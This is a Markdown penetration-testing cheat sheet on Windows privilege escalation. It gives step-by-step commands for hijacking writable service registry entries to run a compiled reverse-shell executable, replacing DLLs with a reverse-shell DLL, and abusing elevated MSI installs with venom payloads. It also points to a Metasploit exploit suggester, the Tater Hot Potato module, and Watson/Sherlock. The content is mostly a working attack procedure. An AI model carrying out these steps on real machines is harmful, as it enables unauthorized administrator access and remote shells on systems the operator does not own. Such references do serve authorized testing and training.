# Privesc

## [â¬… Back to Index](README.md)

---

## Windows

### Services

* Posh
  * Get all: `Get-WmiObject -Class Win32_Service|Format-Table -Property Name,DisplayName,PathName,StartMode`
  * Get specific service DACL: `Get-Acl -Path hklm:\System\CurrentControlSet\services\`
* Cmd: `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v """`
* Injection to writeable service registry entry
  * `apt-get install gcc-mingw-w64`
  * `x86_64-w64-mingw32-gcc scripts/windows_service.c -o revshell.exe`
  * Copy `service.exe` to `C:\temp`
  * `reg add HKLM\SYSTEM\CurrentControlSet\services\service_with_access /v ImagePath /t REG_EXPAND_SZ /d c:\temp\revshell.exe /f`
  * `sc start service_with_access`

### DLLs

* Scan application DLLs for preloading attack: [Rattler](https://github.com/sensepost/rattler)
* Replace writeable DLL path with revshell
  * `apt-get install gcc-mingw-w64`
  * `x86_64-w64-mingw32-gcc scripts/windows_dll.c -shared -o revshell.dll`
  * Copy `revshell.dll` to path the service or app uses.
  * Restart service or open app that runs as higher privilege to trigger DLL load.

### Registry

* Check if msi modules run elevated: `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
  * If so, use `-f msi` for venom payloads.
  * `msiexec /quiet /qn /i revshell.msi`

### MSF

* `run post/multi/recon/local_exploit_suggester`

### Hot Potato

* Posh module: <https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1>

### Exploits

* Suggest exploits for missing KBs
  * Win 10: <https://github.com/rasta-mouse/Watson>
  * < Win 7: <https://github.com/rasta-mouse/Sherlock> (*Deprecated)
